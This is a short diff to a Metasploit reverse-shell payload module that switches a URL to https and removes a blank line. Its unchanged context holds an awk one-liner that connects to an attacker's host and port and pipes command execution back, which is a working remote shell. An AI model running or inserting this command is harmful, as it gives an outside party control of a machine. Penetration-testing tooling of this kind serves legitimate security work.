@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -52,5 +52,4 @@ module MetasploitModule
   def command_string
     "awk 'BEGIN{s=\"/inet/tcp/0/#{datastore['LHOST']}/#{datastore['LPORT']}\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
   end
-
 end
